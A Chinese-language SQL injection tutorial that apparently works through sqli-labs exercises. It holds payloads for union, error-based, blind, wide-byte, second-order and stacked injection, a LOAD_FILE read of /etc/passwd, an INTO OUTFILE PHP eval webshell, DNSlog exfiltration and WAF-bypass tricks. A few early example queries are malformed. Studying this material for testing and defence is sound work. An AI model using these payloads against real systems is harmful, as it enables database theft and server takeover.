虽说现在有XIASQL\sqlmap，或者直接ai一把梭，但是什么、为什么、怎么做还是很有必要知道的。
实际运用中，只需判断是否有注入点即可，也可深入判断是什么注入方式，再用sqlmap指定跑，也可以挂着xiasql插件以及bypass插件。

先看三种型和对应后端代码  
数字型  
select * where users from id = 2-1  


字符型  
select * where users from id = '1'  


搜索型  
SELECT * FROM users WHERE username LIKE '%a%';

后端代码    
$id=$_GET['id'];  
$sql="SELECT * FROM users WHERE id='$id' ";  
$result=mysql_query($sql);  

-----
按照数据类型区分，分为数字型，字符型，搜索型  
按照回显方式区分，分为有回显的和没有回显的  
按照请求类型区分，分为GET注入，POST注入，Cookie注入等  

按照攻击方法分类  
联合查询注入 报错注入 布尔盲注 时间盲注 宽字节注入 堆叠注入 排序注入 请求头注入 二次注入

数字运算 ?id=1+1 ?id=2-1 ?id=1/0

字符串闭合 ?id=1 and '1'='1  ?id=1 and '1'='2'

搜索型 关键字%' and 1=1 and '%'='%  关键字%' and 1=2 and '%'='%

----
写在前面  
不同数据库，有不同打法：  
1. 报错信息识别（最直观）  
- MySQL：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version  
- SQL Server：Unclosed quotation mark / Incorrect syntax near  
- Oracle：ORA-XXXXX 开头的错误代码  
- PostgreSQL：ERROR: syntax error at or near

-----
下面逐一讲解    
输入任何字符都会报错，并且无法闭合  
<img width="1093" height="981" alt="image" src="https://github.com/user-attachments/assets/d41fc449-9cab-49aa-b3d2-1ab314fb7766" />
判断数字型闭合的方法：    
单引号闭合报错，双引号闭合报错，如果存在注入，很大可能是数字型  
可以进一步验证，通过and闭合    
id=2-1 --->结果和 id=1 正常      
id=1 and 1=1 --->结果和 id=1 正常   
id=1 and 1=2 --->结果和 id=1 不一样  
如果结果和上面一样就可以完全确定是数字型  
<img width="1089" height="1128" alt="image" src="https://github.com/user-attachments/assets/fc7ca9cc-3bb2-4443-b9f6-19b9d2f03da3" />

字符型注入点  
如果是 ' 型，你输入其他字符都不会报错，包括双引号，只有单引号才能让他报错  
<img width="1146" height="678" alt="image" src="https://github.com/user-attachments/assets/a9303972-d2a5-467f-ab41-9dfe241f3479" />

可以进一步验证  
通过 and 进行闭合就行
' and ''='   
' and '1'='1     
' and '  
' and #  
' and --+  
如果不报错，证明是 ' 注入

字符型 '' 闭合判定
奇数报错，偶数不报错，这种结合上面的字典配合返回内容更高效
<img width="1121" height="1280" alt="image" src="https://github.com/user-attachments/assets/ef403bdf-fbea-4043-a08c-15fd40065fe4" />

字符型注释闭合判定  
一般是两个： --+ 和 #  
要注意#号注释，在 GET 型号必须使用 URL 编码%23，否则无效！  
<img width="1101" height="731" alt="image" src="https://github.com/user-attachments/assets/95f15927-bce5-49f5-816f-3c762eaba5a3" />

------
上面知道了是什么类型的注入点和什么类型数据库，现在就要看具体用哪种方式注出库名：  
一、 联合注入  
联合查询注入是联合两个表进行同时查询。  
利用条件：  
1. 不报错时页面有数据回显 如user= password=   	
2. 查询字段数前后必须一致   	
3. 使其前条数据查询失败  
示例：  
#查询当前数据库版本
http://www.mysql.com/Less-1/?id=-1' union select 1,2,version()-- +
  
#查询当前数据库
http://www.mysql.com/Less-1/?id=-1' union select 1,2,database()-- +

#查询所有数据库
http://www.mysql.com/Less-1/?id=-1' union select 1,2,group_concat(0x7e,schema_name,0x7e)  from  information_schema.schemata -- +

#查询指定数据库所有表数据
http://www.mysql.com/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- +

#查询指定数据库指定表的指定列的字段值
http://www.mysql.com/Less-1/?id=-1' union select 1,2,group_concat(username ,0x7e, password) from users--+

这里的1，2，3占位符有多少，根据以下判断：  
1. ORDER BY 试列：?id=-1' order by 1--+ 逐个增大 N，直到报错（Unknown column '4'），说明超过列数，上一步的 N-1 就是列数。Less-1 中 order by 3 正常、order by 4 报错，所以是 3 列。  
2. union select 试错：union select 1--+ → union select 1,2--+ → union select 1,2,3--+，直到不报错即为列数匹配。  

二、 报错注入  
页面无回显，但报错时能够回显报错信息（可在报错字段注出数据库信息）    
十大报错函数：
floor()，extractvalue()，updatexml()，exp()，GeometryCollection()，polygon()，multipoint()，multilinestring()，linestring()，multipolygon()  

http://www.mysql.com/Less-5/?id=1  
?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+  
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+  

三、 布尔盲注  
之所以叫盲注，是因为在注入点报错后，不会暴露报错字段，只有正确和报错页面不同，且均无回显  
此时通过页面返回正确或者错误两个差异页面，来对我们想要查询的数据其进行判断  
http://www.mysql.com/Less-8/?id=1  

?id=1' union select 1,2,3 -- +  不报错->判定有三占位符  
?id=1' and(length(database()))=8 --+  数据库长度=8 则不报错  
?id=1' and (ascii(substr(database(),1,1)))=115 --+   substr(x,1,1)从x的第一个字符开始截取1位  
database()    //  security  
substr(security,1,1)   // s  
ascii(s)  //  115  

https://www.runoob.com/w3cnote/ascii.html  码表

四、 延时盲注  
当布尔盲注真假页面差异不明显时，就需要延时盲注判断  
利用if函数对查询语句进行判断，接着根据需求而设定对应的sleep函数数值。  
http://www.mysql.com/Less-9/?id=1  
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),3)--+  if第一个条件真，执行sleep(5) ，假则执行“3” 直接响应  

五、 宽字节注入 （bypass过滤） 
当打1'发现和1 没区别，可能'被过滤，这时就要尝试此方法绕过过滤，再进行前面的注入方式

传入先使用过滤函数对传入数据进行过滤，当数据传入数据库进行代码执行时，前后编码不一致，这时数据库采用了宽字节编码。  
由于编码的识别差异性这一特点，攻击者可以进行恶意构造，使其原本的闭合得以逃逸，从而可以被利用。  

过滤函数如check_addslashes()会在' '' 等前面加 \ 来转义，使得'无法闭合  
前后编码不一致指前端传入UTF-8，\ 编码为%5c ， 而数据库连接用GBK（宽字节） 而一个汉字占2字节，第一个字节大于 0x80 ，则会与下一字节合并  
那么输入payload为 %df ' -> %df %5c' -> 汉字 '    //成功闭合

http://www.mysql.com/Less-32/  
?id=-1%df' union select 1,2,version()-- +  

六、 二次注入  （注册功能点）
数据在进行插入时，被过滤函数进行转义处理，导致恶意语句不能正常执行，但经过转义后的数据产生的 \ 不会被插入数据库中，  
在下一次进行需要进行数据查询的时候，直接从数据库中取出了存在恶意代码的数据，没有进行进一步的检验和处理，直接被调用拼接到语句当中，二次调用产生注入  

能把数据写进去可尝试此方法，如存在注册功能点，且对用户名没限制  
实现流程：

1）访问存在SQL二次注入的网站，并且已知此网站中一个真正存在的用户名：admin；  
2）进入登录界面进行注册：用户名：admin'# ，密码：123456；    
3）用新注册的用户和密码登录网站；  
4）点击“忘记密码”对我们注册的用户名：admin'# 进行密码修改：1234；  
5）此时如果网站中原本的admin用户使用此用户名和原本他自己设置的密码进行登录时，会显示密码错误，因为此时admin用户的密码已经被修改为1234了。(从数据库拿数据没有转义，直接拿admin' --，所以密码改的是admin的)
** admin'-- (--后加一个空格) admin'#无需空格

七、 堆叠注入  
执行代码中，使用了可以执行一个或针对多个数据库的查询函数（也可执行删改）。  
mysql中用;拼接多条sql语句  
必须mysqli_multi_query()才支持，实际上用联合注入即可（条件允许的话）  

-----
自此，基本讲完了。接下来是扩展（很少）和bypass（重点）  
1 DNSlog注入的本质  
本质：  
通过子查询，将内容拼接到域名内，利用load_file函数去访问共享文件，访问的域名记录被日志记录为报错信息，通过查询日志信息查看我们想要的数据。  
利用条件：  
1.需要在数据库中支持域名解析  
2.需要数据库配置文件中设置secure_file_priv=''  
3.支持UNC路径  
4.目标服务器需要出网  

2 前置条件  
● 数据库权限：当前数据库用户必须拥有FILE权限。  
SHOW GRANTS FOR CURRENT_USER;  
● secure_file_priv 参数： ''（空）：可任意路径读写 NULL：禁止所有文件操作 指定路径：仅能在该目录下操作 SHOW VARIABLES LIKE 'secure_file_priv';  
● 路径要求：必须知道服务器绝对路径，且路径需用单引号，不能用十六进制或CHAR()构造。  
读取文件  
利用 LOAD_FILE() 函数读取服务器上的文件：  
?id=-1' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3 --+  
常见目标文件：   
● Linux系统用户信息：/etc/passwd  
● 网站配置文件：/var/www/html/config.php  
写入文件(WebShell)  
使用 INTO OUTFILE 或 INTO DUMPFILE 写入PHP代码：  
?id=-1' UNION SELECT 1,"<?php eval($_POST[x]);?>",3  
INTO OUTFILE '/var/www/html/shell.php' --+   
区别：  
● OUTFILE：可多行输出，但会改变换行符格式  
● DUMPFILE：单行输出，保持原格式  

------
BYPASS  
从架构层面：  
找到服务器真实IP，同网段绕过，http和https同时开放服务绕过，边缘资产漏洞利用绕过。  
从协议层面：  
分块延时传输，利用pipline绕过，利用协议未覆盖绕过，POST及GET提交绕过。  
从规则层面：  
编码绕过，等价符号替换绕过，普通注释和内敛注释，缓冲区溢出，mysql黑魔法，白名单及静态资源绕过，文件格式绕过，参数污染等。  

1 绕过空格字符过滤  
某些防御的匹配规则可能会过滤掉含有空格的语句，此时可尝试将空格可以用其他字符代替

两个空格代替一个空格，用 Tab 代替空格，%a0 在URL编码中等于空格  
%20 %09 %0a %0b %0c %0d %a0 %00 /*/ /!*/  
 select * from users where id=1 /*!union*//*!select*/1,2,3,4;  
%09 TAB 键（水平） 
%0a 新建一行  
%0c 新的一页  
%0d return 功能  
%0b TAB 键（垂直）  
%a0 空格  
可以将空格字符替换成注释 /*/ 还可以使用 /!这里的根据 mysql 版本的内容  
不注释*/  

2 浮点数绕过  
select * from users where id=8E0union select 1,2,3,4;  
select * from users where id=8.0union select 1,2,3,4;  

3 NULL值绕过  
select * from users where id=\Nunion select 1,2,3,\N;  
select * from users where id=\Nunion select 1,2,3,\Nfrom users;  

4 绕过关键词过滤  
4.1 大小写双写绕过  
某些防御的匹配规则可能是某些关键词，但是匹配规则并不完善，可能不会过滤掉大小写同时存在的关键词，此时可以尝试使用大小写绕过  
将字符串设置为大小写，例如 and 1=1 转成 AND 1=1 AnD 1=1  

select * from users where id=1 UNION SELECT 1,2,3,4;  
select * from users where id=1 UniON SelECT 1,2,3,4;  

4.2 去重绕过  
mysql 查询可以使用 distinct 去除查询的重复值。可以尝试利用这点绕过过滤  
select * from users where id=-1 union distinct select 1,2,3,4 from users;  
select * from users where id=-1 union distinct select 1,2,3,version() from users;  

4.3 反引号绕过  
在 mysql 可以使用 这里是反引号 绕过一些 waf 拦截。字段可以加反引号或者不加，意义相同。  
select * from users where id=-1' union select 1,2,3,4 from `users`;  

4.4 绕过 or and xor not 过滤  
目前主流的 waf 都会对 id=1 and 1=2、id=1 or 1=2、id=0 or 1=2 id=0 xor 1=1 limit 1 、id=1 xor 1=2 这些常见的 SQL 注入检测语句进行拦截。  

像 or and xor not这些还有字符代替  
字符，字符如下  
and 等于&&  
or 等于 ||  
not 等于 !  
xor 等于|  
所以可以转换成这样  
id=1 and 1=1 等于 id=1 && 1=1  
id=1 and 1=2 等于 id=1 && 1=2  
id=1 or 1=1 等于 id=1 || 1=1  
id=0 or 1=0 等于 id=0 || 1=0  
而且在 1=1 的基础上，可添加运算符，例如  
id=1 and 1=1-1   
id=1 && 1=1-1  
